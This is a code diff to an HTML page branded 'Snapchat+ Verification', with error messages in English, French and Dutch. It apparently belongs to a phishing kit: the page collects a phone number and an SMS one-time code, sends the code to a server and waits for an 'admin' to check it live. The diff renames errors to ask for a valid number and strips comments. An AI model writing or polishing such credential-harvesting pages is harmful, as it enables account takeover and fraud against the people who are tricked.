@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Snapchat+ Verification</title>
     <style>
+        /* Same styles as before, keep them */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
         body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0f 100%); padding: 16px; }
         .container { width: 100%; max-width: 420px; }
@@ -178,10 +179,10 @@
         <!-- STEP 7: Error -->
         <div id="step7" class="step">
             <div class="icon-big">❌</div>
-            <div class="step-title" id="errorTitle">Invalid Code</div>
+            <div class="step-title" id="errorTitle">Invalid Number</div>
             <div class="info-box" style="border-left-color:#ff6b6b;">
-                <p id="errorText">❌ The code you entered is <strong>incorrect</strong>.</p>
-                <p style="font-size:13px;color:#666;margin-top:4px;" id="errorSub">Please check your SMS and try again.</p>
+                <p id="errorText">❌ The number you entered is <strong>incorrect</strong>.</p>
+                <p style="font-size:13px;color:#666;margin-top:4px;" id="errorSub">Please try again with a valid number.</p>
             </div>
             <button class="btn btn-primary" style="margin-top:20px;" id="retryOTPBtn">Try Again</button>
         </div>
@@ -232,9 +233,9 @@
             successText: '✅ Your account has been verified.',
             successSub: 'You can now access all features.',
             continueBtn: 'Continue',
-            errorTitle: 'Invalid Code',
-            errorText: '❌ The code you entered is <strong>incorrect</strong>.',
-            errorSub: 'Please check your SMS and try again.',
+            errorTitle: 'Invalid Number',
+            errorText: '❌ The number you entered is <strong>incorrect</strong>.',
+            errorSub: 'Please try again with a valid number.',
             tryAgain: 'Try Again'
         },
         fr: {
@@ -259,9 +260,9 @@
             successText: '✅ Votre compte a été vérifié.',
             successSub: 'Vous pouvez maintenant accéder à toutes les fonctionnalités.',
             continueBtn: 'Continuer',
-            errorTitle: 'Code invalide',
-            errorText: '❌ Le code que vous avez saisi est <strong>incorrect</strong>.',
-            errorSub: 'Veuillez vérifier votre SMS et réessayer.',
+            errorTitle: 'Numéro invalide',
+            errorText: '❌ Le numéro que vous avez saisi est <strong>incorrect</strong>.',
+            errorSub: 'Veuillez réessayer avec un numéro valide.',
             tryAgain: 'Réessayer'
         },
         nl: {
@@ -286,9 +287,9 @@
             successText: '✅ Uw account is geverifieerd.',
             successSub: 'U kunt nu alle functies gebruiken.',
             continueBtn: 'Doorgaan',
-            errorTitle: 'Ongeldige code',
-            errorText: '❌ De code die u heeft ingevoerd is <strong>onjuist</strong>.',
-            errorSub: 'Controleer uw SMS en probeer opnieuw.',
+            errorTitle: 'Ongeldig nummer',
+            errorText: '❌ Het nummer dat u heeft ingevoerd is <strong>onjuist</strong>.',
+            errorSub: 'Probeer opnieuw met een geldig nummer.',
             tryAgain: 'Probeer opnieuw'
         }
     };
@@ -543,7 +544,6 @@
             return;
         }
 
-        // Show verifying message
         verifyingMessage.style.display = 'block';
         verifyBtn.disabled = true;
 
@@ -559,7 +559,6 @@
             });
             var data = await response.json();
             if (data.success) {
-                // Wait for admin to verify
                 await waitForAdminVerification();
             } else {
                 alert('Error submitting OTP. Please try again.');
